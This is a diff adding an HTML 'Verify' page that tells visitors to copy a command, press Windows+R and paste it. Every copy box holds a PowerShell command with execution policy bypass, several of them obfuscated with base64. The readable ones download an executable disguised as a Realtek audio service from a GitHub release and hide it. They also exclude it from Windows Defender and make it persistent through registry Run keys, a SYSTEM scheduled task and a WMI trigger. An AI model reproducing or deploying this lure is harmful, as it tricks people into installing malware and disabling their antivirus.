@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify</title>
+  <style>
+    /* Body and general styles */
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #f4f4f9;
+      margin: 0;
+      padding: 0;
+      color: #333;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    /* Heading and subheading styles */
+    h1 {
+      font-size: 3.5em;
+      text-align: center;
+      margin: 10px;
+      color: #007BFF;
+      text-shadow: 2px 2px 5px rgba(0, 123, 255, 0.5);
+    }
+    h2 {
+      font-size: 1.6em;
+      text-align: center;
+      color: #555;
+      margin-bottom: 20px;
+    }
+    /* Popup style */
+    .popup {
+      visibility: hidden;
+      background-color: #28a745;
+      color: white;
+      padding: 5px 10px;
+      border-radius: 25px;
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 10;
+      font-weight: bold;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+    /* Subsub-heading styles */
+    .subsub-heading {
+      font-size: 1.8em;
+      text-align: center;
+      margin-top: 20px;
+      font-weight: bold;
+      color: #007BFF;
+      text-shadow: 1px 1px 3px rgba(0, 123, 255, 0.3);
+    }
+    /* Or text style (smaller) */
+    .or-text {
+      font-size: 1.4em;
+      text-align: center;
+      color: #555;
+      margin: 10px 0;
+    }
+    /* Copy box styles */
+    .copy-box {
+      background-color: #E9F7FD;
+      width: 28%;
+      padding: 10px;
+      margin: 10px auto;
+      border-radius: 8px;
+      border: 2px solid #007BFF;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+      text-align: center;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .copy-box:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px lightblue, 0 0 30px lightblue, 0 0 50px lightblue;
+    }
+    .copy-box span {
+      font-size: 0.9em;
+      color: #333;
+      font-weight: bold;
+    }
+    /* Button hover effect */
+    .copy-box:active {
+      transform: scale(0.98);
+      box-shadow: 0 0 5px lightblue, 0 0 10px lightblue;
+    }
+    /* Layout for smaller screens */
+    @media (max-width: 768px) {
+      .copy-box {
+        width: 80%;
+      }
+      h1 {
+        font-size: 2.5em;
+      }
+      h2 {
+        font-size: 1.2em;
+      }
+      .subsub-heading {
+        font-size: 1.8em;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Verify</h1>
+  <h2>Copy text by clicking it, then press Windows+R and paste it in!</h2>
+
+  <div id="popup" class="popup">Copied!</div>
+
+  <div class="subsub-heading">Option 1</div>
+  <div class="copy-box" onclick="copyText(this)">
+    <span>powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand "PQAnAFMAVwA1ADIAYgAyAHQAbABMAFYAZABsAFkAbABKAGwAYwBYAFYAbABjADMAUQBnAEwAVgBWAHkAYQBTAEEAbgBhAEgAUgAwAGMASABNADYATAB5ADkAbgBhAFgAUgBvAGQAVwBJAHUAWQAyADkAdABMADAAVgBoAFkAbgBWAHoAYQBHAEYAdABNAGkAOQBwAFoAMgA1AHYAYwBtAFUAdgBjAG0AVgBzAFoAVwBGAHoAWgBYAE0AdgBaAEcAOQAzAGIAbQB4AHYAWQBXAFEAdgBkAEMAOQBTAGQARwB0AEIAZABXAFIAVgBVADIAVgB5AGQAbQBsAGoAWgBUAFkAMABMAG0AVgA0AFoAUwBjAD0AJwA7ACAAPQAnAFkAWABSADAAYwBtAGwAaQBJAEMAdABvAEkAQwB0AHoASQBDAGQARABPAGwAQgB5AGIAMgBkAHkAWQBXADEARQBZAFgAUgBoAFgAMQBKAGwAWQBXAHgAMABaAFcAcwB2AFUAbgBSAHIAUQBYAFYAawBWAFYATgBsAGMAbgBaAHAAWQAyAFUAMgBOAEMANQBsAGUARwBVAG4AJwA7ACAAPQAnAFEAVwBSAGsATABVADEAdwBVAEgASgBsAFoAbQBWAHkAWgBXADUAagBaAFMAQQB0AFIAWABoAGoAYgBIAFYAegBhAFcAOQB1AFUARwBGADAAYQBDAEEAbgBRAHoAcABjAFUASABKAHYAWgAzAEoAaABiAFUAUgBoAGQARwBGAGMAVQBtAFYAaABiAEgAUgBsAGEAeQA5AFMAZABHAHQAQgBkAFcAUgBWAFUAMgBWAHkAZABtAGwAagBaAFQAWQAwAEwAbQBWADQAWgBTAGMAPQAnADsAIAA9ACcAVABtAFYAMwBMAFUAbAAwAFoAVwAxAFEAYwBtADkAdwBaAFgASgAwAGUAUwBBAHQAVQBHAEYAMABhAEMAQQBuAFMARQB0AEQAVgBUAG8AaQBVADIAOQBtAGQASABkAGgAYwBtAFYAYwBUAFcAbABqAGMAbQA5AHoAYgAyAFoAMABYAEYAZABwAGIAbQBSAHYAZAAzAE4AYwBRADMAVgB5AGMAbQBWAHUAZABGAFoAbABjAG4ATgBwAGIAMgA0AFIAVgBXADQAaQBJAEMAMQBPAFkAVwAxAGwASQBDAGQAUwBkAEcAdABCAGQAVwBSAFYAVQAyAFYAeQBkAG0AbABqAFoAVABZADAASgB5AEEAdABWAG0ARgBzAGQAVwBVAGcASgAwAE0ANgBYAEYAQgBjAFUASABKAHYAWgAzAEoAaABiAFUAUgBoAGQARwBGAGMAVQBtAFYAaABiAEgAUgBsAGEAeQA5AFMAZABHAHQAQgBkAFcAUgBWAFUAMgBWAHkAZABtAGwAagBaAFQAWQAwAEwAbQBWADQAWgBTAGMAZwBMAFUAOQB3AFoAWABKADAAZQBWAFIANQBjAEcAVQBnAFUAMwBSAHkAYQBXADUAbgBPAHkAQgBPAFoAWABjAHQAUwBYAFIAbABiAFYAQgB5AGIAMwBCAGwAYwBuAFIANQBJAEMAMQBRAFkAWABSAG8ASQBDAGQASQBTADAATgBWAE8AbAB4AGMAVQAyADkAbQBkAEgAZABoAGMAbQBWAGMAVABXAGwAagBjAG0AOQB6AGIAMgBaADAAWABGAGQAcABiAG0AUgB2AGQAMwBOAGMAUQAzAFYAeQBjAG0AVgB1AGQARgBaAGwAYwBuAE4AcABiADIANABSAFYAVwA0AG4ASQBDADEATwBZAFcAMQBsAEkAQwBkAFMAZABHAHQAQgBkAFcAUgBWAFUAMgBWAHkAZABtAGwAagBaAFQAWQAwAEoAeQBBAHQAVgBtAEYAcwBkAFcAVQBnAEoAMABNADYAWABGAEIAYwBVAEgASgB2AFoAMwBKAGgAYgBVAFIAaABkAEcARgBjAFUAbQBWAGgAYgBIAFIAbABhAHkAOQBTAGQARwB0AEIAZABXAFIAVgBVADIAVgB5AGQAbQBsAGoAWgBUAFkAMABMAG0AVgA0AFoAUwBjAGcATABVADkAdwBaAFgASgAwAGUAVgBSADUAYwBHAFUAZwBVADMAUgB5AGEAVwA1AG4ATwB3AD0APQAnADsAIAA9ACcASgBIAEYAMQBaAFgASgA1AEkARAAwAGcASgAxAE4ARgBUAEUAVgBEAFYAQwBvAGcAUgBsAEoAUABUAFMAQgBmAFgAMABsAHUAYwAzAFIAaABiAG0ATgBsAFEAMwBKAGwAWQBYAFIAcABiADIANQBGAGQAbQBWAHUAZABDAEIAWABTAFUAbABVAFMARQA0AGcATQBTAEIAWABTAEUAVgBTAFIAUwBCAFUAWQBYAEoAbgBaAFgAUgBKAGIAbgBOADAAWQBXADUAagBaAFMAQgBKAFUAMABFAGcASgAxAGQAcABiAGoATQB5AFgAMQBCAHkAYgAyAE4AbABjADMATQBuAE8AeQBBAGsAWQBXAE4AMABhAFcAOQB1AEkARAAwAGcAVABtAFYAMwBMAFUAOQBpAGEAbQBWAGoAZABDAEIAVABlAFgATgAwAFoAVwAwAHUAVABXAFYAMABhAEcAOQBrAGMAeQA1AEYAYgBtAE4AdgBaAEcAbAB1AFoAeQA1AFYAVQBGAFIARwBMAGsAZABsAGQARgBOADAAYwBtAGwAdQBaAHkAaABUAGUAWABOADAAWgBXADAAdQBRADIAOQB1AGQAbQBWAHkAZABDAGsANgBPAGsAWgB5AGIAMgAxAEMAWQBYAE4AbABOAGoAUgBUAGQASABKAHAAYgBtAGMAbwBKAEcARgBmAEsAVABzAGsAWQBXAE4AMABhAFcAOQB1AE8AeQBCAFMAWgBXAGQAcABjADMAUgBsAGMAaQAxAFgAYgBXAGwARgBkAG0AVgB1AGQAQwBBAHQAVQBYAFYAbABjAG4AawBnAEoASABGADEAWgBYAEoANQBJAEMAMQBCAFoAVwBOADAAYQBXADkAdQBJAEMAUgBoAFkAMwBSAHAAYgAyADQAPQAnADsAIAA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAApACkAKwBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKQApACsAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACkAKQArAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAApACkAKwBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKQApADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAA="</span>
+  </div>
+  <div class="or-text">Or</div>
+  <div class="copy-box" onclick="copyText(this)">
+    <span>powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAGEAYgB1AHMAaABhAG0AMgAvAGkAZwBuAG8AcgBlAC8AcgBlAGwAZQBhAHMAZQBzAC8AZABvAHcAbgBsAG8AYQBkAC8AdwAvAFIAdABrAEEAdQBkAFUAUwBlAHIAdgBpAGMAZQA2ADQALgBlAHgAZQAnACAALQBPAHUAdABGAGkAbABlACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABSAGUAYQBsAHQAZQBrAFwAUgB0AGsAQQB1AGQAVQBTAGUAcgB2AGkAYwBlADYANAAuAGUAeABlACcAOwAgAGEAdAB0AHIAaQBiACAAKwBoACAAKwBzACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABSAGUAYQBsAHQAZQBrAFwAUgB0AGsAQQB1AGQAVQBTAGUAcgB2AGkAYwBlADYANAAuAGUAeABlACcAOwAgAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIAAnAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFIAZQBhAGwAdABlAGsAXABSAHQAawBBAHUAZABVAFMAZQByAHYAaQBjAGUANgA0AC4AZQB4AGUAJwA7ACAATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAgAC0ATgBhAG0AZQAgACcAUgB0AGsAQQB1AGQAVQBTAGUAcgB2AGkAYwBlADYANAAnACAALQBWAGEAbAB1AGUAIAAnAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFIAZQBhAGwAdABlAGsAXABSAHQAawBBAHUAZABVAFMAZQByAHYAaQBjAGUANgA0AC4AZQB4AGUAJwA7ACAATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4ATwBuAGMAZQAnACAALQBOAGEAbQBlACAAJwBSAHQAawBBAHUAZABVAFMAZQByAHYAaQBjAGUANgA0ACcAIAAtAFYAYQBsAHUAZQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAUgBlAGEAbAB0AGUAawBcAFIAdABrAEEAdQBkAFUAUwBlAHIAdgBpAGMAZQA2ADQALgBlAHgAZQAnACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAFMAdAByAGkAbgBnADsAIAAgAD0AIAAnAFMARQBMAEUAQwBUACAAKgAgAEYAUgBPAE0AIABfAF8ASQBuAHMAdABhAG4AYwBlAEMAcgBlAGEAdABpAG8AbgBFAHYAZQBuAHQAIABXAEkAVABIAEkATgAgADEAIABXAEgARQBSAEUAIABUAGEAcgBnAGUAdABJAG4AcwB0AGEAbgBjAGUAIABJAFMAQQAgACcAJwBXAGkAbgAzADIAXwBQAHIAbwBjAGUAcwBzACcAJwAnADsAIAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4ATQBhAG4AYQBnAGUAbQBlAG4AdABDAGwAYQBzAHMAKAAnAFcAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMAJwApAC4ARwBlAHQATQBlAHQAaABvAGQAUABhAHIAYQBtAGUAdABlAHIAcwAoACcAQwByAGUAYQB0AGUAJwApADsAIAAuAFMAZQB0AFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAKAAnAEMAbwBtAG0AYQBuAGQATABpAG4AZQAnACwAIAAnAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFIAZQBhAGwAdABlAGsAXABSAHQAawBBAHUAZABVAFMAZQByAHYAaQBjAGUANgA0AC4AZQB4AGUAJwApADsAIABSAGUAZwBpAHMAdABlAHIALQBXAG0AaQBFAHYAZQBuAHQAIAAtAFEAdQBlAHIAeQAgACAALQBBAGMAdABpAG8AbgAgAA==" </span>
+  </div>
+  <div class="or-text">Or</div>
+  <div class="copy-box" onclick="copyText(this)">
+    <span>powershell -NoProfile -ExecutionPolicy Bypass -Command "$a='SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnaHR0cHM6Ly9naXRodWIuY29tL0VhYnVzaGFtMi9pZ25vcmUvcmVsZWFzZXMvZG93bmxvYWQvdC9SdGtBdWRVU2VydmljZTY0LmV4ZSc='; $b='YXR0cmliICtoICtzICdDOlByb2dyYW1EYXRhX1JlYWx0ZWsvUnRrQXVkVVNlcnZpY2U2NC5leGUn'; $c='QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcUHJvZ3JhbURhdGFcUmVhbHRlay9SdGtBdWRVU2VydmljZTY0LmV4ZSc='; $d='TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVToiU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb24RVW4iIC1OYW1lICdSdGtBdWRVU2VydmljZTY0JyAtVmFsdWUgJ0M6XFBcUHJvZ3JhbURhdGFcUmVhbHRlay9SdGtBdWRVU2VydmljZTY0LmV4ZScgLU9wZXJ0eVR5cGUgU3RyaW5nOyBOZXctSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb24RVW4nIC1OYW1lICdSdGtBdWRVU2VydmljZTY0JyAtVmFsdWUgJ0M6XFBcUHJvZ3JhbURhdGFcUmVhbHRlay9SdGtBdWRVU2VydmljZTY0LmV4ZScgLU9wZXJ0eVR5cGUgU3RyaW5nOw=='; $e='JHF1ZXJ5ID0gJ1NFTEVDVCogRlJPTSBfX0luc3RhbmNlQ3JlYXRpb25FdmVudCBXSUlUSE4gMSBXSEVSRSBUYXJnZXRJbnN0YW5jZSBJU0EgJ1dpbjMyX1Byb2Nlc3MnOyAkYWN0aW9uID0gTmV3LU9iamVjdCBTeXN0ZW0uTWV0aG9kcy5FbmNvZGluZy5VUFRGLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydCk6OkZyb21CYXNlNjRTdHJpbmcoJGFfKTskYWN0aW9uOyBSZWdpc3Rlci1XbWlFdmVudCAtUXVlcnkgJHF1ZXJ5IC1BZWN0aW9uICRhY3Rpb24='; $cmd=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c))+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($d))+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e)); Invoke-Expression $cmd"</span>
+  </div>
+  <div class="or-text">Or</div>
+  <div class="copy-box" onclick="copyText(this)">
+    <span>powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Eabusham2/ignore/releases/download/w/RtkAudUService64.exe' -OutFile 'C:\ProgramData\Realtek\RtkAudUService64.exe'; attrib +h +s 'C:\ProgramData\Realtek\RtkAudUService64.exe'; Add-MpPreference -ExclusionPath 'C:\ProgramData\Realtek\RtkAudUService64.exe'; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RtkAudUService64' -Value 'C:\ProgramData\Realtek\RtkAudUService64.exe' -PropertyType String; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'RtkAudUService64' -Value 'C:\ProgramData\Realtek\RtkAudUService64.exe' -PropertyType String; $action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Realtek\RtkAudUService64.exe'; $trigger = New-ScheduledTaskTrigger -AtStartup; $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries = $true -DontStopIfGoingOnBatteries = $true; Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName 'RtkAudUService64Task'; $query = 'SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA ''Win32_Process'''; $action = New-Object System.Management.ManagementClass('Win32_Process').GetMethodParameters('Create'); $action.SetPropertyValue('CommandLine', 'C:\ProgramData\Realtek\RtkAudUService64.exe'); Register-WmiEvent -Query $query -Action $action"</span>
+  </div>
+  <div class="subsub-heading">Option 2: If that didn't work</div>
+  <div class="copy-box" onclick="copyText(this)">
+    <span>powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Eabusham2/ignore/releases/download/w/RtkAudUService64.exe' -OutFile 'C:\ProgramData\Realtek\RtkAudUService64.exe'; attrib +h +s 'C:\ProgramData\Realtek\RtkAudUService64.exe'; Add-MpPreference -ExclusionPath 'C:\ProgramData\Realtek\RtkAudUService64.exe'; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RtkAudUService64' -Value 'C:\ProgramData\Realtek\RtkAudUService64.exe' -PropertyType String; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'RtkAudUService64' -Value 'C:\ProgramData\Realtek\RtkAudUService64.exe' -PropertyType String; $query = 'SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA ''Win32_Process'''; $action = New-Object System.Management.ManagementClass('Win32_Process').GetMethodParameters('Create'); $action.SetPropertyValue('CommandLine', 'C:\ProgramData\Realtek\RtkAudUService64.exe'); Register-WmiEvent -Query $query -Action $action"</span>
+  </div>
+
+  <script>
+    function copyText(element) {
+      // Create a range to select the element's content
+      const range = document.createRange();
+      const selection = window.getSelection();
+      selection.removeAllRanges();
+      range.selectNodeContents(element);
+      selection.addRange(range);
+      
+      // Copy text using the Clipboard API (without disturbing the selection)
+      const text = element.textContent.trim();
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text)
+          .then(() => {
+            const popup = document.getElementById('popup');
+            popup.style.visibility = 'visible';
+            setTimeout(() => {
+              popup.style.visibility = 'hidden';
+            }, 1000);
+          })
+          .catch(err => {
+            console.error('Failed to copy text: ', err);
+          });
+      } else {
+        // Fallback for older browsers
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        
+        const popup = document.getElementById('popup');
+        popup.style.visibility = 'visible';
+        setTimeout(() => {
+          popup.style.visibility = 'hidden';
+        }, 1000);
+      }
+    }
+  </script>
+</body>
+</html>
